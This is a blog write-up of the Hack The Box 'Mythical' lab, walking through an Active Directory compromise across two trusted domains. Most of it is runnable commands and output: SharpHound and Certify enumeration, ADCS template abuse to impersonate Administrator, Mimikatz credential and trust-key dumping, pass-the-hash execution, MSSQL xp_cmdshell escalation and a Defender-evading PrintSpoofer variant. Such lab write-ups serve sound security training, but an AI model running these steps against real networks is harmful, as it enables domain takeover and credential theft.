---
layout: post
title: "Hackthebox - Mythical PROLAB"
date: 2025-12-12
categories: writeup-prolab
author: bl4ckarch
tags: active-directory mythic-c2 adcs esc4 esc1 domain-trust mssql potato
---

Mythical is an intermediate mini pro lab on Hack The Box (originally a chain on Vulnlab) created by XCT.

This lab simulates an assumed breach scenario where we already have a Mythic C2 agent running inside the network. The environment spans two Active Directory domains with a trust relationship between them.

Machines:
- **10.13.38.31** - DC01.mythical-us.vl (Domain Controller)
- **10.13.38.32** - Mythic C2 Server (Ubuntu)
- **10.13.38.33** - DC02.mythical-eu.vl (Domain Controller)

## Mythic C2 Access

We start by logging into the Mythic interface at `https://10.13.38.32:7443/new/login`:

```
mythic_admin : wG4jmjNcEcfmzv3QbEcJdSVTDEjCnX
```

Once inside, we have an active Apollo agent callback from a user named **Momo.Ayase** on DC01.

## Initial Enumeration

First thing I do is set the sleep to 0 for instant command execution:

```
sleep 0 0
```

For AD enumeration, I load SharpHound directly into memory. In Mythic, you use `register_assembly` to upload a .NET binary, then `execute_assembly` to run it:

```
register_assembly SharpHound.exe
execute_assembly SharpHound.exe -c All
```

After it completes, grab the zip:

```
download 20251212_BloodHound.zip
```

BloodHound shows Momo has RDP access but nothing immediately exploitable. Time to dig deeper.

## Finding the KeePass Vault

While poking around the filesystem, I noticed an rsync installation at `C:\_admin\cwrsync\bin`. Interesting. Let's see what shares are available:

```
cd C:\_admin\cwrsync\bin
shell rsync.exe --list-only rsync://192.168.25.1
```

There's a `mythical` share. Let's grab everything:

```
shell mkdir C:\bl4ckarch
shell rsync -av rsync://192.168.25.1/mythical C:\bl4ckarch
```

Inside we find `it.kdbx` - a KeePass database. Download it through the agent.

## Cracking KeePass 4

The database is KeePass 4 format which `keepass2john` doesn't handle. I used [keepass4brute](https://github.com/r3nt0n/keepass4brute):

```bash
./keepass4brute.sh it.kdbx /opt/rockyou.txt
```

Got the master password. Inside the vault: credentials for **domjoin** - likely a service account for joining machines to the domain.

## ADCS Exploitation - ESC4 to ESC1

With valid domain creds, let's hunt for certificate vulnerabilities:

```
register_assembly Certify.exe
execute_assembly Certify.exe find /vulnerable
```

Certify finds the **Machine** template is vulnerable - ESC4. The template allows us to modify its configuration because of weak ACLs.

The attack path:
1. Create a machine account (we can do this as domjoin)
2. Use that machine account to modify the template
3. Convert ESC4 → ESC1 by enabling the SAN extension
4. Request a cert as Administrator

First, impersonate domjoin:

```
make_token mythical-us\domjoin <PASSWORD>
```

Create our machine account using StandIn:

```
register_assembly StandIn_v13_Net35.exe
execute_assembly StandIn_v13_Net35.exe --computer YOURPC --make
```

Now switch to the machine account context:

```
make_token mythical-us\yourpc$ <GENERATED_PASSWORD>
```

Modify the template to allow SAN specification (ESC1):

```
execute_assembly StandIn_v13_Net35.exe --ADCS --filter Machine --ess --add
```

Grant enrollment rights to Domain Users:

```
execute_assembly StandIn_v13_Net35.exe --ADCS --filter Machine --ntaccount "mythical-us\domain users" --enroll --add
```

Now request a certificate as Administrator:

```
execute_assembly Certify.exe request /ca:dc01.mythical-us.vl\mythical-us-DC01-CA /template:Machine /altname:administrator@mythical-us.vl
```

## Getting Administrator Hash

Save the certificate output to `cert.pem` and convert it:

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Upload and use Rubeus to get the NT hash:

```
upload cert.pfx
register_assembly Rubeus.exe
execute_assembly Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Momo.Ayase\cert.pfx /ptt /nowrap /getcredentials
```

We get the Administrator NTLM hash. Now to get code execution - Mimikatz PTH wasn't working so I used Invoke-SMBExec to run our agent as admin:

```
powershell Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username administrator -Hash <NTLM_HASH> -Command "C:\programdata\google\update.exe"
```

New callback as SYSTEM on DC01.

## Pivoting to the Second Domain

With SYSTEM on DC01, let's look at domain trusts:

```
upload mimikatz.exe
shell mimikatz.exe "lsadump::trust /patch" exit
```

Output shows a one-way trust: MYTHICAL-EU trusts MYTHICAL-US. We can use the trust key to request tickets in the other domain.

```
execute_assembly Rubeus.exe asktgt /user:mythical-us$ /domain:mythical-eu.vl /rc4:<TRUST_RC4_KEY> /nowrap /ptt
```

Now we can query MYTHICAL-EU:

```
powershell Get-ADUser -Filter * -Server dc02.mythical-eu.vl | Select SamAccountName
```

Interesting accounts: `svc_ldap`, `svc_sql`, and `root`.

## Credentials from DC02 Share

Check what shares are accessible on DC02:

```
shell net view \\dc02.mythical-eu.vl
```

There's a `dev` share. Inside:

```
ls \\dc02.mythical-eu.vl\dev
```

Found `getusers.exe` and `Autologon64.exe`. Downloaded `getusers.exe` and threw it into ILSpy - hardcoded creds for **svc_ldap**.

Password spray reveals **svc_sql** uses the same password.

## MSSQL to Shell

Connecting to SQL Server on DC02:

```
make_token mythical-eu\svc_sql <PASSWORD>
```

Upload sqlcmd (renamed to avoid detection):

```
upload sqlcmd.exe
shell move sqlcmd.exe sql.exe
```

Check if we're sysadmin:

```
shell sql.exe -S dc02.mythical-eu.vl,1433 -Q "SELECT IS_SRVROLEMEMBER('sysadmin');"
```

Nope. But we can abuse the trustworthy database misconfiguration on msdb. The svc_sql account has db_owner on msdb, and msdb has TRUSTWORTHY enabled:

```
shell sql.exe -S dc02.mythical-eu.vl,1433 -d msdb -Q "CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'MYTHICAL-EU\svc_sql','sysadmin';"
shell sql.exe -S dc02.mythical-eu.vl,1433 -d msdb -Q "EXEC sp_privesc;"
```

Verify:

```
shell sql.exe -S dc02.mythical-eu.vl,1433 -Q "SELECT IS_SRVROLEMEMBER('sysadmin');"
```

Now we're sysadmin. Enable xp_cmdshell:

```
shell sql.exe -S dc02.mythical-eu.vl,1433 -Q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
```

Set up a share to transfer our agent:

```
shell mkdir C:\bl4ckarch
shell net share bl4ckarch=C:\bl4ckarch /grant:everyone,full
shell copy C:\programdata\google\update.exe C:\bl4ckarch\update.exe
```

Copy and execute on DC02:

```
shell sql.exe -S dc02.mythical-eu.vl,1433 -Q "EXEC xp_cmdshell 'copy \\10.13.38.31\bl4ckarch\update.exe C:\Users\Public\update.exe';"
shell sql.exe -S dc02.mythical-eu.vl,1433 -Q "EXEC xp_cmdshell 'C:\Users\Public\update.exe';"
```

Got callback as `nt service\mssql$sqlexpress`.

## Privilege Escalation - Custom Printspoofer

The SQL service account has SeImpersonatePrivilege. Standard potatoes (SweetPotato, GodPotato, EfsPotato) all got caught by Defender.

I used my custom PrintSpoofer variant that uses direct syscalls and some anti-analysis tricks:

```
upload pwn_v3.exe
shell pwn_v3.exe -c C:\Users\Public\update.exe
```

```
[*] namedpipesgoesbrrrrrrr v3 - starting...
[*] Initializing syscalls...
[+] Syscalls initialized
[*] namedpipesgoesbrrrrrrr v3 (ultimate)
[*] Running anti-analysis checks...
[+] Environment OK
[*] Command: C:\Users\Public\update.exe
[*] Checking privileges...
[+] Privilege OK
[+] Pipe: namedpipesgoesbrrrrrrrr
[*] Creating named pipe...
[+] Pipe created: 00000000000000F4
[*] Triggering spooler...
[+] RpcOpenPrinter OK
[+] Connected! Spooler connected to our pipe.
[*] Impersonating and spawning process...
[+] Impersonation OK
[+] Primary token: 0000000000000148
[*] Trying CreateProcessWithTokenW...
[+] CreateProcessWithTokenW SUCCESS! PID: 776
[+] SUCCESS! Got SYSTEM!
```

SYSTEM on DC02.

## The Hidden Flag

The lab description mentioned the flag is "in memory" for user "root". After getting SYSTEM, I ran Mimikatz:

```
shell mimikatz.exe "sekurlsa::logonpasswords" exit
```

Scrolling through the output, found the root user with WDigest enabled:

```
User Name         : root
Domain            : MYTHICAL-EU
	wdigest :	
	 * Username : root
	 * Domain   : MYTHICAL-EU
	 * Password : YOURFLAGHERE
```

The flag was literally the cleartext password stored in LSASS memory. Pretty clever twist.

---


## Tools Used

- **Mythic C2** - Command and control
- **SharpHound/BloodHound** - AD enumeration
- **Certify/StandIn** - ADCS exploitation
- **Rubeus** - Kerberos abuse
- **Mimikatz** - Credential extraction
- **Custom PrintSpoofer** - Printspoofer with Defender bypass